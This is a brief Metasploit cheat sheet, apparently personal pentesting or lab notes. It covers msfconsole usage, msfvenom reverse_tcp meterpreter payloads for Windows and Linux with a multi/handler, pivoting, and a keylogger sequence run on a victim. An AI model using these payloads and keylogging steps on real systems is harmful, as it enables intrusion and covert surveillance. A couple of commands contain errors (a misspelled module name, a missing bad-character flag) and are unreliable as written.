# Metasploit

## Resources
- <https://www.offsec.com/metasploit-unleashed/introduction/>




`ctrl+Z` Background session
`sessions -l` List sessions
`sessions -i [NUMBER]` foreground session


```
sudo msfdb init && msfconsole

search [KEYWORD]
Example: search eternalblue

use [NUMBER]

show options

set [OPTION] [VALUE]
Example: set RHOST [IP]

run
exploit

```

## Meterpreter
meterpreter not the same as shell


## Multi Handler (msfvenom + metasploit)

```
> use multi/handler


# generate payload (windows, ergo `.exe`)

> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe -o payload.exe

> set PAYLOAD windows/x64/meterpreter/reverse_tcp

> run


# generate payload (linux)
>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf '\x00\x0a\x0d' -o virus




```




## Pivoting
```
> use post/multi/manage/autorute



portfwd add -l [LOCAL PORT] -p [REMOTE PORT] -r [REMOTE IP]
```




## Keylogger
once with a foothold in the victim
```
# 1 find the PID:
> ps -S explorer.exe
> migrate [PID]
> keyscan_start
...
> keyscan_dump

```












